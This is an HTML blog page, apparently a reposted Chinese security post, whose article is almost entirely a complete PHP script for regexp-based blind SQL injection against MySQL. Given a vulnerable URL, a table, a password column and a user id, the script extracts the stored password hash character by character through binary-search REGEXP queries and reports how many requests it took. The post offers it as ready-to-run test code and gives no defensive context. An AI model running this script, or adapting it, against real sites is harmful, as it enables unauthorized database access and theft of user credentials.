@@ -1,0 +1,920 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQL盲注,正则表达式," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在群共享里发现了一个pdf的文档，是个好东西，他主要是讲解的使用正则表达式来盲注！ 他也给了一段测试代码！可以自己测试！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;?php  /&amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#4">
+<meta name="keywords" content="SQL盲注,正则表达式">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL盲注之使用正则表达式">
+<meta property="og:url" content="http://yoursite.com/2012/05/26/SQL盲注之使用正则表达式/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在群共享里发现了一个pdf的文档，是个好东西，他主要是讲解的使用正则表达式来盲注！ 他也给了一段测试代码！可以自己测试！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;?php  /&amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#4">
+<meta property="og:updated_time" content="2018-02-26T06:00:49.580Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL盲注之使用正则表达式">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在群共享里发现了一个pdf的文档，是个好东西，他主要是讲解的使用正则表达式来盲注！ 他也给了一段测试代码！可以自己测试！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;?php  /&amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#42 &amp;#4">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/05/26/SQL盲注之使用正则表达式/"/>
+
+
+
+
+
+  <title>SQL盲注之使用正则表达式 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/05/26/SQL盲注之使用正则表达式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL盲注之使用正则表达式</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-05-26T10:43:21+08:00">
+                2012-05-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp;&nbsp;&nbsp;&nbsp; 今天在群共享里发现了一个pdf的文档，是个好东西，他主要是讲解的使用正则表达式来盲注！</p>
+<p>他也给了一段测试代码！可以自己测试！</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?php
+
+/&#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 
+ &#42   Example of Regexp Attack in Blind SQL Injection by IHteam
+ &#42   This example work only with MySQL.
+ &#42 
+ &#42 
+ &#42   This program is free software; you can redistribute it and/or modify  
+ &#42   it under the terms of the GNU General Public License as published by  
+ &#42   the Free Software Foundation; either version 2 of the License, or     
+ &#42   (at your option) any later version.                                   
+ &#42                                                                         
+ &#42   This program is distributed in the hope that it will be useful,       
+ &#42   but WITHOUT ANY WARRANTY; without even the implied warranty of        
+ &#42   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         
+ &#42   GNU General Public License for more details.                          
+ &#42                                                                        
+ &#42 
+ &#42   Usage:
+ &#42 
+ &#42   ./regexp_bsqli.php http://localhost/page.php?id=1 users password id_user 1
+ &#42 
+ &#42 
+ &#42   WHERE:
+ &#42 
+ &#42   http://localhost/page.php?id=1    -&gt;    Vulnerable page with valid id.
+ &#42   users                -&gt;    Users Table.
+ &#42   password                -&gt;    Password column.
+ &#42   id_user                -&gt;    Primary key of users table.
+ &#42   1                    -&gt;    Valid id_user.
+ &#42 
+ &#42 
+ &#42 
+ &#42   The query will result in:
+ &#42   ... FROM users WHERE id_user = 1 and password ...
+ &#42 
+ &#42 
+ &#42                                             Written by R00T_ATI and white_sheep.
+ &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42/
+
+$url = $argv[1];                  // the url is like this: "http://localhost/index.php?id=1"
+$table_name = $argv[2];                // name of table to extract hash
+$column_name = $argv[3];            // column name that contain hash
+$id_name = $argv[4];                // primary key to identify a single user
+$id_val = $argv[5];                // a real value of key
+
+$chars = array( "a", "b", "c", "d", "e", "f" );                    // array of chars
+$numbers = array( "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");        // array of numbers
+
+$nquery = 0;
+
+$fchars = 0;                    // MIN value for chars array
+$lchars = 5;                    // MAX value for chars array
+$old_lchars = $lchars;
+
+$fnumbers = 0;                    // MIN value for numbers array
+$lnumbers = 9;                    // MAX value for numbers array
+$old_lnumbers = $lnumbers;
+
+$counter = array ("0" =&gt; 1, "1" =&gt; 2, "2" =&gt; 3, "3" =&gt; 4, "4" =&gt; 5, "5" =&gt; 6, "6" =&gt; 7, "7" =&gt; 8, "8" =&gt; 9, "9" =&gt; 10, "a" =&gt; 11, "b" =&gt; 12, "c" =&gt; 13, "d" =&gt; 14, "e" =&gt; 15, "f" =&gt; 16 );
+
+$urland = $url . "%20and%201=";
+
+$exit = false;
+$regexpc = "";
+$regexpn = "";
+$founded = "";
+
+function search($array, $start, $end, $founded){
+    global $urland, $table_name, $column_name, $id_name, $id_val, $and11, $and12, $nquery;
+    $old_end = $end;
+    $end = floor(($end+$start)/2);
+
+    while (1) {
+
+        if ( ( $end - $start ) != 1 &amp;&amp; ( $start - $end ) != 0) {
+            $regexp = "’^" . $founded . "[" . $array[$start] . "-" . $array[$end] . "]’";
+            $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)";
+            $nquery++;
+            echo "Page Request: " . $urland . $query . "
+";
+            $result = file_get_contents($urland . urlencode($query));
+
+            if ( $result == $and12 ) {
+                echo "Result : FALSE
+
+";
+                $tmp = $start;
+                $start = $end + 1;
+                $end = $old_end;
+            } else {
+                echo "Result : TRUE
+
+";
+                $old_end = $end;
+                $end = floor(($end+$start)/2);
+            }
+        } else {
+            $regexp = "’^" . $founded . $array[$start] . "’";
+            $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)";
+            $nquery++;
+            echo "Page Request: " . $urland . $query . " 
+";
+            $result = file_get_contents($urland . urlencode($query));
+
+            if ( $result == $and12 ) {
+                echo "Result : FALSE
+
+";
+                $regexp = "’^" . $founded . $array[$end] . "’";
+                $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)";
+                $nquery++;
+                echo "Page Request: " . $urland . $query . "
+";
+                $result = file_get_contents($urland . urlencode($query));
+
+                if ( $result == $and12 ) {
+                    echo "Result : FALSE
+
+";
+                    $end = $old_end;
+                } else
+                    echo "Result : TRUE
+
+";
+
+                $founded .= $array[$end];
+
+            } else {
+                echo "Result : TRUE
+
+";
+                $founded .= $array[$start];
+            }
+
+            return $founded;
+        }
+    }
+}
+
+$and11 = file_get_contents($urland . "1");        // GET page.php?id=1 and 1=1, to identify TRUE statement
+$and12 = file_get_contents($urland . "2");        // GET page.php?id=1 and 1=1, to identify FALSE statement
+
+if ( $and11 == $and12 ){                // result of (and 1=1) and (and 1=2) is equal? then not vulnerable!
+  echo "Not vulnerabile. Exit.
+";
+  exit;
+}
+
+while ( ! $exit ) {
+    $regexpc = "’^" . $founded . "[" . $chars[$fchars] . "-" . $chars[$lchars] . "]’";                // Generate regexp with chars
+    $regexpn = "’^" . $founded . "[" . $numbers[$fnumbers] . "-" . $numbers[$lnumbers] . "]’";            // Generate regexp with numbers
+
+    $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexpc)";        // Query declaration Example: "(SELECT 1 FROM users WHERE id=1 and password REGEXP ’^5[a-f]’)"
+    $nquery++;
+    echo "Page Request: " . $urland . $query . "
+";
+
+    $result = file_get_contents($urland . urlencode($query));
+
+    if ( $result == $and12 ) {
+        echo "Result : FALSE
+
+";
+
+        $founded = search($numbers, $fnumbers, $lnumbers, $founded);
+
+        $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP ’^$founded$’)";
+        $nquery++;
+        echo "Page Request: " . $urland . $query . "
+";
+        $result = file_get_contents($urland . urlencode($query));
+
+        if ( $result == $and11 ) {
+            echo "Result : TRUE
+
+";
+            $exit = true;
+        } else 
+            echo "Result : FALSE
+
+";
+
+    } else {
+        echo "Result : TRUE
+
+";
+
+        $founded = search($chars, $fchars, $lchars, $founded);
+
+        $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP ’^$founded$’)";
+        $nquery++;
+        echo "Page Request: " . $urland . $query . "
+";
+        $result = file_get_contents($urland . urlencode($query));
+
+        if ( $result == $and11 ){
+            echo "Result : TRUE
+
+";
+            $exit = true;
+        } else 
+            echo "Result : FALSE
+
+";
+    }
+}
+
+echo "Hash Found.
+";
+echo "Hash: $founded
+";
+echo "Number of request: $nquery
+";
+
+$md5_arr = preg_split("//", $founded);
+
+$nbrute = 0 ;
+
+foreach ( $md5_arr as $char ){
+    if ( ! $char )
+        continue;
+
+    $nbrute += $counter[$char];
+
+}
+
+$nbrute += 16;
+
+echo "Number of request with bruteforce ( 0-9 a-f ): $nbrute
+"; 
+
+?&gt;</pre> 
+
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL盲注/" rel="tag"># SQL盲注</a>
+          
+            <a href="/tags/正则表达式/" rel="tag"># 正则表达式</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/05/26/转-PHP-CGI-Argument-Injection-Exploit-CVE-2012-1823/" rel="next" title="[转]PHP CGI Argument Injection Exploit CVE-2012-1823">
+                <i class="fa fa-chevron-left"></i> [转]PHP CGI Argument Injection Exploit CVE-2012-1823
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/05/26/利用互联网收集信息-Information-gathering-Doxing/" rel="prev" title="利用互联网收集信息?Information_gathering_Doxing">
+                利用互联网收集信息?Information_gathering_Doxing <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
